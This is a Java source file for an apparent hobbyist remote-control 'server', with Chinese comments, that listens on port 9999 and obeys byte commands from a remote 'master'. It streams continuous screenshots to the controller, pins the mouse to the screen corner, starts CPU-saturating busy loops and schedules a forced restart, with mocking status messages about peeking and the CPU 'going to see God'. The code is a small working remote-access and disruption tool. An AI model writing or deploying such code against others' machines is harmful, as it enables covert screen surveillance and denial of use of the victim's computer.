package src.remoteControl;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.ComponentEvent;
import java.awt.event.ComponentListener;
import java.awt.image.BufferedImage;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;

/**
 * 远控软件【服务器端】
 * @author huawangxin
 *
 * 
 * @date 2016年11月10日 下午3:09:29
 */
public class Remote extends JFrame{
	
	/**
	 * 
	 */
	private static final long serialVersionUID = 8631975439078711814L;


	public static final int PORT = 9999 ;
	
	
	JPanel mainPanel ;
	JButton startButton ;
	JButton stopButton ;
	JTextArea msgText ;
	JScrollPane scroll ;
	
	ServerSocket server ;
	Socket socket ;
	
	
	public Remote(){
		
		mainPanel = new JPanel() ;
		startButton = new JButton( "启动" ) ;
		stopButton = new JButton( "停止" ) ;
		stopButton.setEnabled( false );
		
		startButton.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				startServer() ;
			}
		} );
		stopButton.addActionListener( new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				stopServer() ;
			}
		} );
		msgText = new JTextArea() ;
		msgText.setEditable( false );
		scroll = new JScrollPane( msgText ) ;
		
		mainPanel.setLayout( null );
		mainPanel.add( startButton ) ;
		mainPanel.add( stopButton ) ;
		mainPanel.add( scroll ) ;
		
		this.add( mainPanel ) ;
		this.addComponentListener( new ComponentListener() {
			
			public void componentShown(ComponentEvent e) {
				
			}
			
			public void componentResized(ComponentEvent e) {
				autoLayout() ;
			}
			
			public void componentMoved(ComponentEvent e) {
				
			}
			
			public void componentHidden(ComponentEvent e) {
				
			}
		} );
		this.setSize( 350 , 300 ) ;
		this.setLocation(560,260);
		this.setDefaultCloseOperation( EXIT_ON_CLOSE );
		this.setVisible( true );
	}

	/***
	 * 启动服务
	 */
	public void startServer(){
		//启动服务
		try{
			server = new ServerSocket( PORT ) ;	
			print( "准备监听用户连接" );
		}catch(Exception ex){
			print( "启动失败:" + ex.getMessage() );
		}
		startButton.setEnabled( false );
		stopButton.setEnabled( true );

		//启动线程处理用户连接
		new Thread( new Runnable() {
			
			public void run() {
				accept() ;
			}
		} ).start(); ;  
	}
	/***
	 * 停止服务
	 */
	public void stopServer(){
		try {
			socket.close() ;
		} catch (Exception e) {}
		try{
			server.close();
		}catch(Exception e){}
		socket = null ;
		server = null ;
		print( "服务已停止" );
		startButton.setEnabled( true );
		stopButton.setEnabled( false );
		msgText.setEditable(false) ;
	}
	/***
	 * 处理用户连接
	 */
	public void accept(){
		try{
			socket = server.accept() ;
			print( "来了一个主人....." ) ;
			msgText.setEditable(true) ;
//			InputStream in = socket.getInputStream() ;
			//提供服务
			new Thread(new Runnable() {
				
				public void run() {
					service() ;
				}
			}).start() ;
		}catch(Exception e){
			print( "监听失败:" + e.getMessage() );
			stopServer() ;
		}
	}	
	
	/*
	 * 为用户提供服务
	 */
	public void service(){
		print("准备24小时随时为主人提供服务...") ;
		try {
			InputStream in = socket.getInputStream() ;
			while(true){
				print("准备接受主人新指令") ;
				int command = in.read() ;
				if(command == 1){
					closeComputer() ;
					print("关机指令完成") ;
				}else if (command == 2) {
					dying() ;
					print("CPU已经去见上帝了") ;
				}else if(command == 3){
					observer() ;
					print("偷窥了") ;
				}else if(command == 4){
					connectScreen();
					print("鼠标已锁定") ;
				}else if(command == 5){
					stopServer();
					print("与服务器连接断开") ;
				}else if(command == 6){
					flag=false;
					print("CPU恢复正常") ;
				}else if(command == 7){
					print("主人累了，不看你咯") ;
				}else if(command == 8){
					flag1=false;
					print("已取消控制屏幕") ;
				}else if(command == 9){
					closeComputer1();
					print("取消关机") ;
				}
			}
		} catch (Exception e) {
			print("为主人提供服务失败:"+e.getMessage() ) ;
			stopServer() ;
		}
		
	}
	boolean flag1=true;
		public void connectScreen(){
			new Thread(new Runnable() {
				public void run() {
					try {
						Robot robot=new Robot();
						while(flag1){
							robot.mouseMove(0, 0);
						}
					} catch (Exception e) {
					}					
				}
			}).start();
		}
	
	public void observer(){
		while(true){
		try {
			OutputStream out = socket.getOutputStream() ;
			//获得屏幕大小
//			Dimension d = Toolkit.getDefaultToolkit().getScreenSize() ;
			//捕捉屏幕图形
			Robot robot = new Robot() ;
			BufferedImage image = robot.createScreenCapture( new Rectangle(0,0,1920,1680)) ;
			//发送图像
			ImageIO.write(image , "bmp" , out ) ;
		} catch (Exception e) {
			print("监控出错:"+e.getMessage()) ;
			stopServer() ;
		}}
	}
	boolean flag=true;
	public void dying(){
		for(int i = 0 ; i < 4 ; i++){
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					while(flag){
					}
				}
			}).start() ;
		}
	}
	
	public void closeComputer(){
		try {
			Runtime.getRuntime().exec("shutdown -r -t 600") ;
//			Runtime.getRuntime().exec("D:/软件安装基地/qq/QQProtect/Bin/QQProtect.exe");//可以以此做成定制版开机一键启动

		} catch (Exception e) {
			print("执行关机命令失败:"+e.getMessage()) ;
		}
	}
	
	public void closeComputer1(){
		try {
			Runtime.getRuntime().exec("shutdown -a") ;
		} catch (IOException e) {
			print("执行关机命令失败:"+e.getMessage()) ;
		}
	}
	/***
	 * 自动布局
	 */
	public void autoLayout(){
		startButton.setBounds( 10 , 10 , 80 , 30 ) ;
		stopButton.setBounds( 100 , 10 , 80 , 30 );
		scroll.setBounds( 0 , 50 , mainPanel.getWidth() , mainPanel.getHeight() - 50 ) ;
	}
	/***
	 * 将消息打印到文本框
	 * @param msg
	 */
	public void print(String msg){
		msgText.setText( msgText.getText() + msg + "\r\n" );
	}
	
}
